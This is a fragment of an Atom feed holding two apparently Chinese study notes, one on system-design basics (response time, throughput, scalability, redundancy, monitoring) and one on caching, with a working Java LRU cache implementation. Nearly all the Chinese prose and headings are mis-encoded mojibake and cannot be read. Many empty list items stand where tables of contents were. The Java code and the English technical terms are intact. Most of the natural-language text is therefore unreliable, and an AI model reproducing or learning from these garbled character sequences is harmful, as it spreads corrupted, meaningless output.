    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
</ul>

<h1 id="ä¸€ã€æ€§èƒ½" tabindex="-1"> ä¸€ã€æ€§èƒ½</h1>
<h2 id="æ€§èƒ½æŒ‡æ ‡" tabindex="-1"> æ€§èƒ½æŒ‡æ ‡</h2>
<h3 id="_1-å“åº”æ—¶é—´" tabindex="-1"> 1. å“åº”æ—¶é—´</h3>
<p>æŒ‡æŸä¸ªè¯·æ±‚ä»å‘å‡ºåˆ°æ¥æ”¶åˆ°å“åº”æ¶ˆè€—çš„æ—¶é—´ã€‚</p>
<p>åœ¨å¯¹å“åº”æ—¶é—´è¿›è¡Œæµ‹è¯•æ—¶ï¼Œé€šå¸¸é‡‡ç”¨é‡å¤è¯·æ±‚çš„æ–¹å¼ï¼Œç„¶åè®¡ç®—å¹³å‡å“åº”æ—¶é—´ã€‚</p>
<h3 id="_2-ååé‡" tabindex="-1"> 2. ååé‡</h3>
<p>æŒ‡ç³»ç»Ÿåœ¨å•ä½æ—¶é—´å†…å¯ä»¥å¤„ç†çš„è¯·æ±‚æ•°é‡ï¼Œé€šå¸¸ä½¿ç”¨æ¯ç§’çš„è¯·æ±‚æ•°æ¥è¡¡é‡ã€‚</p>
<h3 id="_3-å¹¶å‘ç”¨æˆ·æ•°" tabindex="-1"> 3. å¹¶å‘ç”¨æˆ·æ•°</h3>
<p>æŒ‡ç³»ç»Ÿèƒ½åŒæ—¶å¤„ç†çš„å¹¶å‘ç”¨æˆ·è¯·æ±‚æ•°é‡ã€‚</p>
<p>åœ¨æ²¡æœ‰å¹¶å‘å­˜åœ¨çš„ç³»ç»Ÿä¸­ï¼Œè¯·æ±‚è¢«é¡ºåºæ‰§è¡Œï¼Œæ­¤æ—¶å“åº”æ—¶é—´ä¸ºååé‡çš„å€’æ•°ã€‚ä¾‹å¦‚ç³»ç»Ÿæ”¯æŒçš„ååé‡ä¸º 100 req/sï¼Œé‚£ä¹ˆå¹³å‡å“åº”æ—¶é—´åº”è¯¥ä¸º 0.01sã€‚</p>
<p>ç›®å‰çš„å¤§å‹ç³»ç»Ÿéƒ½æ”¯æŒå¤šçº¿ç¨‹æ¥å¤„ç†å¹¶å‘è¯·æ±‚ï¼Œå¤šçº¿ç¨‹èƒ½å¤Ÿæé«˜ååé‡ä»¥åŠç¼©çŸ­å“åº”æ—¶é—´ï¼Œä¸»è¦æœ‰ä¸¤ä¸ªåŸå› ï¼š</p>
<ul>
<li>å¤š CPU</li>
<li>IO ç­‰å¾…æ—¶é—´</li>
</ul>
<p>ä½¿ç”¨ IO å¤šè·¯å¤ç”¨ç­‰æ–¹å¼ï¼Œç³»ç»Ÿåœ¨ç­‰å¾…ä¸€ä¸ª IO æ“ä½œå®Œæˆçš„è¿™æ®µæ—¶é—´å†…ä¸éœ€è¦è¢«é˜»å¡ï¼Œå¯ä»¥å»å¤„ç†å…¶å®ƒè¯·æ±‚ã€‚é€šè¿‡å°†è¿™ä¸ªç­‰å¾…æ—¶é—´åˆ©ç”¨èµ·æ¥ï¼Œä½¿å¾— CPU åˆ©ç”¨ç‡å¤§å¤§æé«˜ã€‚</p>
<p>å¹¶å‘ç”¨æˆ·æ•°ä¸æ˜¯è¶Šé«˜è¶Šå¥½ï¼Œå› ä¸ºå¦‚æœå¹¶å‘ç”¨æˆ·æ•°å¤ªé«˜ï¼Œç³»ç»Ÿæ¥ä¸åŠå¤„ç†è¿™ä¹ˆå¤šçš„è¯·æ±‚ï¼Œä¼šä½¿å¾—è¿‡å¤šçš„è¯·æ±‚éœ€è¦ç­‰å¾…ï¼Œé‚£ä¹ˆå“åº”æ—¶é—´å°±ä¼šå¤§å¤§æé«˜ã€‚</p>
<h2 id="æ€§èƒ½ä¼˜åŒ–" tabindex="-1"> æ€§èƒ½ä¼˜åŒ–</h2>
<h3 id="_1-é›†ç¾¤" tabindex="-1"> 1. é›†ç¾¤</h3>
<p>å°†å¤šå°æœåŠ¡å™¨ç»„æˆé›†ç¾¤ï¼Œä½¿ç”¨è´Ÿè½½å‡è¡¡å°†è¯·æ±‚è½¬å‘åˆ°é›†ç¾¤ä¸­ï¼Œé¿å…å•ä¸€æœåŠ¡å™¨çš„è´Ÿè½½å‹åŠ›è¿‡å¤§å¯¼è‡´æ€§èƒ½é™ä½ã€‚</p>
<h3 id="_2-ç¼“å­˜" tabindex="-1"> 2. ç¼“å­˜</h3>
<p>ç¼“å­˜èƒ½å¤Ÿæé«˜æ€§èƒ½çš„åŸå› å¦‚ä¸‹ï¼š</p>
<ul>
<li>ç¼“å­˜æ•°æ®é€šå¸¸ä½äºå†…å­˜ç­‰ä»‹è´¨ä¸­ï¼Œè¿™ç§ä»‹è´¨å¯¹äºè¯»æ“ä½œç‰¹åˆ«å¿«ï¼›</li>
<li>ç¼“å­˜æ•°æ®å¯ä»¥ä½äºé è¿‘ç”¨æˆ·çš„åœ°ç†ä½ç½®ä¸Šï¼›</li>
<li>å¯ä»¥å°†è®¡ç®—ç»“æœè¿›è¡Œç¼“å­˜ï¼Œä»è€Œé¿å…é‡å¤è®¡ç®—ã€‚</li>
</ul>
<h3 id="_3-å¼‚æ­¥" tabindex="-1"> 3. å¼‚æ­¥</h3>
<p>æŸäº›æµç¨‹å¯ä»¥å°†æ“ä½œè½¬æ¢ä¸ºæ¶ˆæ¯ï¼Œå°†æ¶ˆæ¯å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¹‹åç«‹å³è¿”å›ï¼Œä¹‹åè¿™ä¸ªæ“ä½œä¼šè¢«å¼‚æ­¥å¤„ç†ã€‚</p>
<h1 id="äºŒã€ä¼¸ç¼©æ€§" tabindex="-1"> äºŒã€ä¼¸ç¼©æ€§</h1>
<p>æŒ‡ä¸æ–­å‘é›†ç¾¤ä¸­æ·»åŠ æœåŠ¡å™¨æ¥ç¼“è§£ä¸æ–­ä¸Šå‡çš„ç”¨æˆ·å¹¶å‘è®¿é—®å‹åŠ›å’Œä¸æ–­å¢é•¿çš„æ•°æ®å­˜å‚¨éœ€æ±‚ã€‚</p>
<h2 id="ä¼¸ç¼©æ€§ä¸æ€§èƒ½" tabindex="-1"> ä¼¸ç¼©æ€§ä¸æ€§èƒ½</h2>
<p>å¦‚æœç³»ç»Ÿå­˜åœ¨æ€§èƒ½é—®é¢˜ï¼Œé‚£ä¹ˆå•ä¸ªç”¨æˆ·çš„è¯·æ±‚æ€»æ˜¯å¾ˆæ…¢çš„ï¼›</p>
<p>å¦‚æœç³»ç»Ÿå­˜åœ¨ä¼¸ç¼©æ€§é—®é¢˜ï¼Œé‚£ä¹ˆå•ä¸ªç”¨æˆ·çš„è¯·æ±‚å¯èƒ½ä¼šå¾ˆå¿«ï¼Œä½†æ˜¯åœ¨å¹¶å‘æ•°å¾ˆé«˜çš„æƒ…å†µä¸‹ç³»ç»Ÿä¼šå¾ˆæ…¢ã€‚</p>
<h2 id="å®ç°ä¼¸ç¼©æ€§" tabindex="-1"> å®ç°ä¼¸ç¼©æ€§</h2>
<p>åº”ç”¨æœåŠ¡å™¨åªè¦ä¸å…·æœ‰çŠ¶æ€ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾ˆå®¹æ˜“åœ°é€šè¿‡è´Ÿè½½å‡è¡¡å™¨å‘é›†ç¾¤ä¸­æ·»åŠ æ–°çš„æœåŠ¡å™¨ã€‚</p>
<p>å…³ç³»å‹æ•°æ®åº“çš„ä¼¸ç¼©æ€§é€šè¿‡ Sharding æ¥å®ç°ï¼Œå°†æ•°æ®æŒ‰ä¸€å®šçš„è§„åˆ™åˆ†å¸ƒåˆ°ä¸åŒçš„èŠ‚ç‚¹ä¸Šï¼Œä»è€Œè§£å†³å•å°å­˜å‚¨æœåŠ¡å™¨çš„å­˜å‚¨ç©ºé—´é™åˆ¶ã€‚</p>
<p>å¯¹äºéå…³ç³»å‹æ•°æ®åº“ï¼Œå®ƒä»¬å¤©ç”Ÿå°±æ˜¯ä¸ºæµ·é‡æ•°æ®è€Œè¯ç”Ÿï¼Œå¯¹ä¼¸ç¼©æ€§çš„æ”¯æŒç‰¹åˆ«å¥½ã€‚</p>
<h1 id="ä¸‰ã€æ‰©å±•æ€§" tabindex="-1"> ä¸‰ã€æ‰©å±•æ€§</h1>
<p>æŒ‡çš„æ˜¯æ·»åŠ æ–°åŠŸèƒ½æ—¶å¯¹ç°æœ‰ç³»ç»Ÿçš„å…¶å®ƒåº”ç”¨æ— å½±å“ï¼Œè¿™å°±è¦æ±‚ä¸åŒåº”ç”¨å…·å¤‡ä½è€¦åˆçš„ç‰¹ç‚¹ã€‚</p>
<p>å®ç°å¯æ‰©å±•ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼š</p>
<ul>
<li>ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—è¿›è¡Œè§£è€¦ï¼Œåº”ç”¨ä¹‹é—´é€šè¿‡æ¶ˆæ¯ä¼ é€’è¿›è¡Œé€šä¿¡ï¼›</li>
<li>ä½¿ç”¨åˆ†å¸ƒå¼æœåŠ¡å°†ä¸šåŠ¡å’Œå¯å¤ç”¨çš„æœåŠ¡åˆ†ç¦»å¼€æ¥ï¼Œä¸šåŠ¡ä½¿ç”¨åˆ†å¸ƒå¼æœåŠ¡æ¡†æ¶è°ƒç”¨å¯å¤ç”¨çš„æœåŠ¡ã€‚æ–°å¢çš„äº§å“å¯ä»¥é€šè¿‡è°ƒç”¨å¯å¤ç”¨çš„æœåŠ¡æ¥å®ç°ä¸šåŠ¡é€»è¾‘ï¼Œå¯¹å…¶å®ƒäº§å“æ²¡æœ‰å½±å“ã€‚</li>
</ul>
<h1 id="å››ã€å¯ç”¨æ€§" tabindex="-1"> å››ã€å¯ç”¨æ€§</h1>
<h2 id="å†—ä½™" tabindex="-1"> å†—ä½™</h2>
<p>ä¿è¯é«˜å¯ç”¨çš„ä¸»è¦æ‰‹æ®µæ˜¯ä½¿ç”¨å†—ä½™ï¼Œå½“æŸä¸ªæœåŠ¡å™¨æ•…éšœæ—¶å°±è¯·æ±‚å…¶å®ƒæœåŠ¡å™¨ã€‚</p>
<p>åº”ç”¨æœåŠ¡å™¨çš„å†—ä½™æ¯”è¾ƒå®¹æ˜“å®ç°ï¼Œåªè¦ä¿è¯åº”ç”¨æœåŠ¡å™¨ä¸å…·æœ‰çŠ¶æ€ï¼Œé‚£ä¹ˆæŸä¸ªåº”ç”¨æœåŠ¡å™¨æ•…éšœæ—¶ï¼Œè´Ÿè½½å‡è¡¡å™¨å°†è¯¥åº”ç”¨æœåŠ¡å™¨åŸå…ˆçš„ç”¨æˆ·è¯·æ±‚è½¬å‘åˆ°å¦ä¸€ä¸ªåº”ç”¨æœåŠ¡å™¨ä¸Šï¼Œä¸ä¼šå¯¹ç”¨æˆ·æœ‰ä»»ä½•å½±å“ã€‚</p>
<p>å­˜å‚¨æœåŠ¡å™¨çš„å†—ä½™éœ€è¦ä½¿ç”¨ä¸»ä»å¤åˆ¶æ¥å®ç°ï¼Œå½“ä¸»æœåŠ¡å™¨æ•…éšœæ—¶ï¼Œéœ€è¦æå‡ä»æœåŠ¡å™¨ä¸ºä¸»æœåŠ¡å™¨ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºåˆ‡æ¢ã€‚</p>
<h2 id="ç›‘æ§" tabindex="-1"> ç›‘æ§</h2>
<p>å¯¹ CPUã€å†…å­˜ã€ç£ç›˜ã€ç½‘ç»œç­‰ç³»ç»Ÿè´Ÿè½½ä¿¡æ¯è¿›è¡Œç›‘æ§ï¼Œå½“æŸä¸ªä¿¡æ¯è¾¾åˆ°ä¸€å®šé˜ˆå€¼æ—¶é€šçŸ¥è¿ç»´äººå‘˜ï¼Œä»è€Œåœ¨ç³»ç»Ÿå‘ç”Ÿæ•…éšœä¹‹å‰åŠæ—¶å‘ç°é—®é¢˜ã€‚</p>
<h2 id="æœåŠ¡é™çº§" tabindex="-1"> æœåŠ¡é™çº§</h2>
<p>æœåŠ¡é™çº§æ˜¯ç³»ç»Ÿä¸ºäº†åº”å¯¹å¤§é‡çš„è¯·æ±‚ï¼Œä¸»åŠ¨å…³é—­éƒ¨åˆ†åŠŸèƒ½ï¼Œä»è€Œä¿è¯æ ¸å¿ƒåŠŸèƒ½å¯ç”¨ã€‚</p>
<h1 id="äº”ã€å®‰å…¨æ€§" tabindex="-1"> äº”ã€å®‰å…¨æ€§</h1>
<p>è¦æ±‚ç³»ç»Ÿåœ¨åº”å¯¹å„ç§æ”»å‡»æ‰‹æ®µæ—¶èƒ½å¤Ÿæœ‰å¯é çš„åº”å¯¹æªæ–½ã€‚</p>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li>å¤§å‹ç½‘ç«™æŠ€æœ¯æ¶æ„ï¼šæ ¸å¿ƒåŸç†ä¸æ¡ˆä¾‹åˆ†æ</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸€ã€ç¼“å­˜ç‰¹å¾</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E7%BC%93%E5%AD%98.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E7%BC%93%E5%AD%98.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="ä¸€ã€ç¼“å­˜ç‰¹å¾" tabindex="-1"> ä¸€ã€ç¼“å­˜ç‰¹å¾</h1>
<h2 id="å‘½ä¸­ç‡" tabindex="-1"> å‘½ä¸­ç‡</h2>
<p>å½“æŸä¸ªè¯·æ±‚èƒ½å¤Ÿé€šè¿‡è®¿é—®ç¼“å­˜è€Œå¾—åˆ°å“åº”æ—¶ï¼Œç§°ä¸ºç¼“å­˜å‘½ä¸­ã€‚</p>
<p>ç¼“å­˜å‘½ä¸­ç‡è¶Šé«˜ï¼Œç¼“å­˜çš„åˆ©ç”¨ç‡ä¹Ÿå°±è¶Šé«˜ã€‚</p>
<h2 id="æœ€å¤§ç©ºé—´" tabindex="-1"> æœ€å¤§ç©ºé—´</h2>
<p>ç¼“å­˜é€šå¸¸ä½äºå†…å­˜ä¸­ï¼Œå†…å­˜çš„ç©ºé—´é€šå¸¸æ¯”ç£ç›˜ç©ºé—´å°çš„å¤šï¼Œå› æ­¤ç¼“å­˜çš„æœ€å¤§ç©ºé—´ä¸å¯èƒ½éå¸¸å¤§ã€‚</p>
<p>å½“ç¼“å­˜å­˜æ”¾çš„æ•°æ®é‡è¶…è¿‡æœ€å¤§ç©ºé—´æ—¶ï¼Œå°±éœ€è¦æ·˜æ±°éƒ¨åˆ†æ•°æ®æ¥å­˜æ”¾æ–°åˆ°è¾¾çš„æ•°æ®ã€‚</p>
<h2 id="æ·˜æ±°ç­–ç•¥" tabindex="-1"> æ·˜æ±°ç­–ç•¥</h2>
<ul>
<li>
<p>FIFOï¼ˆFirst In First Outï¼‰ï¼šå…ˆè¿›å…ˆå‡ºç­–ç•¥ï¼Œåœ¨å®æ—¶æ€§çš„åœºæ™¯ä¸‹ï¼Œéœ€è¦ç»å¸¸è®¿é—®æœ€æ–°çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨ FIFOï¼Œä½¿å¾—æœ€å…ˆè¿›å…¥çš„æ•°æ®ï¼ˆæœ€æ™šçš„æ•°æ®ï¼‰è¢«æ·˜æ±°ã€‚</p>
</li>
<li>
<p>LRUï¼ˆLeast Recently Usedï¼‰ï¼šæœ€è¿‘æœ€ä¹…æœªä½¿ç”¨ç­–ç•¥ï¼Œä¼˜å…ˆæ·˜æ±°æœ€ä¹…æœªä½¿ç”¨çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ä¸Šæ¬¡è¢«è®¿é—®æ—¶é—´è·ç¦»ç°åœ¨æœ€ä¹…çš„æ•°æ®ã€‚è¯¥ç­–ç•¥å¯ä»¥ä¿è¯å†…å­˜ä¸­çš„æ•°æ®éƒ½æ˜¯çƒ­ç‚¹æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ç»å¸¸è¢«è®¿é—®çš„æ•°æ®ï¼Œä»è€Œä¿è¯ç¼“å­˜å‘½ä¸­ç‡ã€‚</p>
</li>
<li>
<p>LFUï¼ˆLeast Frequently Usedï¼‰ï¼šæœ€ä¸ç»å¸¸ä½¿ç”¨ç­–ç•¥ï¼Œä¼˜å…ˆæ·˜æ±°ä¸€æ®µæ—¶é—´å†…ä½¿ç”¨æ¬¡æ•°æœ€å°‘çš„æ•°æ®ã€‚</p>
</li>
</ul>
<h1 id="äºŒã€lru" tabindex="-1"> äºŒã€LRU</h1>
<p>ä»¥ä¸‹æ˜¯åŸºäº åŒå‘é“¾è¡¨ + HashMap çš„ LRU ç®—æ³•å®ç°ï¼Œå¯¹ç®—æ³•çš„è§£é‡Šå¦‚ä¸‹ï¼š</p>
<ul>
<li>è®¿é—®æŸä¸ªèŠ‚ç‚¹æ—¶ï¼Œå°†å…¶ä»åŸæ¥çš„ä½ç½®åˆ é™¤ï¼Œå¹¶é‡æ–°æ’å…¥åˆ°é“¾è¡¨å¤´éƒ¨ã€‚è¿™æ ·å°±èƒ½ä¿è¯é“¾è¡¨å°¾éƒ¨å­˜å‚¨çš„å°±æ˜¯æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨çš„èŠ‚ç‚¹ï¼Œå½“èŠ‚ç‚¹æ•°é‡å¤§äºç¼“å­˜æœ€å¤§ç©ºé—´æ—¶å°±æ·˜æ±°é“¾è¡¨å°¾éƒ¨çš„èŠ‚ç‚¹ã€‚</li>
<li>ä¸ºäº†ä½¿åˆ é™¤æ“ä½œæ—¶é—´å¤æ‚åº¦ä¸º O(1)ï¼Œå°±ä¸èƒ½é‡‡ç”¨éå†çš„æ–¹å¼æ‰¾åˆ°æŸä¸ªèŠ‚ç‚¹ã€‚HashMap å­˜å‚¨ç€ Key åˆ°èŠ‚ç‚¹çš„æ˜ å°„ï¼Œé€šè¿‡ Key å°±èƒ½ä»¥ O(1) çš„æ—¶é—´å¾—åˆ°èŠ‚ç‚¹ï¼Œç„¶åå†ä»¥ O(1) çš„æ—¶é—´å°†å…¶ä»åŒå‘é˜Ÿåˆ—ä¸­åˆ é™¤ã€‚</li>
</ul>
<div><pre><code><span>public</span> <span>class</span> <span>LRU</span><span><span>&lt;</span><span>K</span><span>,</span> <span>V</span><span>></span></span> <span>implements</span> <span>Iterable</span><span><span>&lt;</span><span>K</span><span>></span></span> <span>{</span>

    <span>private</span> <span>Node</span> head<span>;</span>
    <span>private</span> <span>Node</span> tail<span>;</span>
    <span>private</span> <span>HashMap</span><span><span>&lt;</span><span>K</span><span>,</span> <span>Node</span><span>></span></span> map<span>;</span>
    <span>private</span> <span>int</span> maxSize<span>;</span>

    <span>private</span> <span>class</span> <span>Node</span> <span>{</span>

        <span>Node</span> pre<span>;</span>
        <span>Node</span> next<span>;</span>
        <span>K</span> k<span>;</span>
        <span>V</span> v<span>;</span>

        <span>public</span> <span>Node</span><span>(</span><span>K</span> k<span>,</span> <span>V</span> v<span>)</span> <span>{</span>
            <span>this</span><span>.</span>k <span>=</span> k<span>;</span>
            <span>this</span><span>.</span>v <span>=</span> v<span>;</span>
        <span>}</span>
    <span>}</span>


    <span>public</span> <span>LRU</span><span>(</span><span>int</span> maxSize<span>)</span> <span>{</span>

        <span>this</span><span>.</span>maxSize <span>=</span> maxSize<span>;</span>
        <span>this</span><span>.</span>map <span>=</span> <span>new</span> <span>HashMap</span><span><span>&lt;</span><span>></span></span><span>(</span>maxSize <span>*</span> <span>4</span> <span>/</span> <span>3</span><span>)</span><span>;</span>

        head <span>=</span> <span>new</span> <span>Node</span><span>(</span><span>null</span><span>,</span> <span>null</span><span>)</span><span>;</span>
        tail <span>=</span> <span>new</span> <span>Node</span><span>(</span><span>null</span><span>,</span> <span>null</span><span>)</span><span>;</span>

        head<span>.</span>next <span>=</span> tail<span>;</span>
        tail<span>.</span>pre <span>=</span> head<span>;</span>
    <span>}</span>


    <span>public</span> <span>V</span> <span>get</span><span>(</span><span>K</span> key<span>)</span> <span>{</span>

        <span>if</span> <span>(</span><span>!</span>map<span>.</span><span>containsKey</span><span>(</span>key<span>)</span><span>)</span> <span>{</span>
            <span>return</span> <span>null</span><span>;</span>
        <span>}</span>

        <span>Node</span> node <span>=</span> map<span>.</span><span>get</span><span>(</span>key<span>)</span><span>;</span>
        <span>unlink</span><span>(</span>node<span>)</span><span>;</span>
        <span>appendHead</span><span>(</span>node<span>)</span><span>;</span>

        <span>return</span> node<span>.</span>v<span>;</span>
    <span>}</span>


    <span>public</span> <span>void</span> <span>put</span><span>(</span><span>K</span> key<span>,</span> <span>V</span> value<span>)</span> <span>{</span>

        <span>if</span> <span>(</span>map<span>.</span><span>containsKey</span><span>(</span>key<span>)</span><span>)</span> <span>{</span>
            <span>Node</span> node <span>=</span> map<span>.</span><span>get</span><span>(</span>key<span>)</span><span>;</span>
            <span>unlink</span><span>(</span>node<span>)</span><span>;</span>
        <span>}</span>

        <span>Node</span> node <span>=</span> <span>new</span> <span>Node</span><span>(</span>key<span>,</span> value<span>)</span><span>;</span>
        map<span>.</span><span>put</span><span>(</span>key<span>,</span> node<span>)</span><span>;</span>
        <span>appendHead</span><span>(</span>node<span>)</span><span>;</span>

        <span>if</span> <span>(</span>map<span>.</span><span>size</span><span>(</span><span>)</span> <span>></span> maxSize<span>)</span> <span>{</span>
            <span>Node</span> toRemove <span>=</span> <span>removeTail</span><span>(</span><span>)</span><span>;</span>
            map<span>.</span><span>remove</span><span>(</span>toRemove<span>.</span>k<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>


    <span>private</span> <span>void</span> <span>unlink</span><span>(</span><span>Node</span> node<span>)</span> <span>{</span>

        <span>Node</span> pre <span>=</span> node<span>.</span>pre<span>;</span>
        <span>Node</span> next <span>=</span> node<span>.</span>next<span>;</span>

        pre<span>.</span>next <span>=</span> next<span>;</span>
        next<span>.</span>pre <span>=</span> pre<span>;</span>

        node<span>.</span>pre <span>=</span> <span>null</span><span>;</span>
        node<span>.</span>next <span>=</span> <span>null</span><span>;</span>
    <span>}</span>


    <span>private</span> <span>void</span> <span>appendHead</span><span>(</span><span>Node</span> node<span>)</span> <span>{</span>
        <span>Node</span> next <span>=</span> head<span>.</span>next<span>;</span>
        node<span>.</span>next <span>=</span> next<span>;</span>
        next<span>.</span>pre <span>=</span> node<span>;</span>
        node<span>.</span>pre <span>=</span> head<span>;</span>
        head<span>.</span>next <span>=</span> node<span>;</span>
    <span>}</span>


    <span>private</span> <span>Node</span> <span>removeTail</span><span>(</span><span>)</span> <span>{</span>

        <span>Node</span> node <span>=</span> tail<span>.</span>pre<span>;</span>

        <span>Node</span> pre <span>=</span> node<span>.</span>pre<span>;</span>
        tail<span>.</span>pre <span>=</span> pre<span>;</span>
        pre<span>.</span>next <span>=</span> tail<span>;</span>

        node<span>.</span>pre <span>=</span> <span>null</span><span>;</span>
        node<span>.</span>next <span>=</span> <span>null</span><span>;</span>

        <span>return</span> node<span>;</span>
    <span>}</span>


    <span>@Override</span>
    <span>public</span> <span>Iterator</span><span><span>&lt;</span><span>K</span><span>></span></span> <span>iterator</span><span>(</span><span>)</span> <span>{</span>

        <span>return</span> <span>new</span> <span>Iterator</span><span><span>&lt;</span><span>K</span><span>></span></span><span>(</span><span>)</span> <span>{</span>
            <span>private</span> <span>Node</span> cur <span>=</span> head<span>.</span>next<span>;</span>

            <span>@Override</span>
            <span>public</span> <span>boolean</span> <span>hasNext</span><span>(</span><span>)</span> <span>{</span>
                <span>return</span> cur <span>!=</span> tail<span>;</span>
            <span>}</span>

            <span>@Override</span>
            <span>public</span> <span>K</span> <span>next</span><span>(</span><span>)</span> <span>{</span>
                <span>Node</span> node <span>=</span> cur<span>;</span>
                cur <span>=</span> cur<span>.</span>next<span>;</span>
                <span>return</span> node<span>.</span>k<span>;</span>
            <span>}</span>
        <span>}</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br></div></div><h1 id="ä¸‰ã€ç¼“å­˜ä½ç½®" tabindex="-1"> ä¸‰ã€ç¼“å­˜ä½ç½®</h1>
<h2 id="æµè§ˆå™¨" tabindex="-1"> æµè§ˆå™¨</h2>
<p>å½“ HTTP å“åº”å…è®¸è¿›è¡Œç¼“å­˜æ—¶ï¼Œæµè§ˆå™¨ä¼šå°† HTMLã€CSSã€JavaScriptã€å›¾ç‰‡ç­‰é™æ€èµ„æºè¿›è¡Œç¼“å­˜ã€‚</p>
<h2 id="isp" tabindex="-1"> ISP</h2>
<p>ç½‘ç»œæœåŠ¡æä¾›å•†ï¼ˆISPï¼‰æ˜¯ç½‘ç»œè®¿é—®çš„ç¬¬ä¸€è·³ï¼Œé€šè¿‡å°†æ•°æ®ç¼“å­˜åœ¨ ISP ä¸­èƒ½å¤Ÿå¤§å¤§æé«˜ç”¨æˆ·çš„è®¿é—®é€Ÿåº¦ã€‚</p>
<h2 id="åå‘ä»£ç†" tabindex="-1"> åå‘ä»£ç†</h2>
<p>åå‘ä»£ç†ä½äºæœåŠ¡å™¨ä¹‹å‰ï¼Œè¯·æ±‚ä¸å“åº”éƒ½éœ€è¦ç»è¿‡åå‘ä»£ç†ã€‚é€šè¿‡å°†æ•°æ®ç¼“å­˜åœ¨åå‘ä»£ç†ï¼Œåœ¨ç”¨æˆ·è¯·æ±‚åå‘ä»£ç†æ—¶å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ç¼“å­˜è¿›è¡Œå“åº”ã€‚</p>
<h2 id="æœ¬åœ°ç¼“å­˜" tabindex="-1"> æœ¬åœ°ç¼“å­˜</h2>
<p>ä½¿ç”¨ Guava Cache å°†æ•°æ®ç¼“å­˜åœ¨æœåŠ¡å™¨æœ¬åœ°å†…å­˜ä¸­ï¼ŒæœåŠ¡å™¨ä»£ç å¯ä»¥ç›´æ¥è¯»å–æœ¬åœ°å†…å­˜ä¸­çš„ç¼“å­˜ï¼Œé€Ÿåº¦éå¸¸å¿«ã€‚</p>
<h2 id="åˆ†å¸ƒå¼ç¼“å­˜" tabindex="-1"> åˆ†å¸ƒå¼ç¼“å­˜</h2>
<p>ä½¿ç”¨ Redisã€Memcache ç­‰åˆ†å¸ƒå¼ç¼“å­˜å°†æ•°æ®ç¼“å­˜åœ¨åˆ†å¸ƒå¼ç¼“å­˜ç³»ç»Ÿä¸­ã€‚</p>
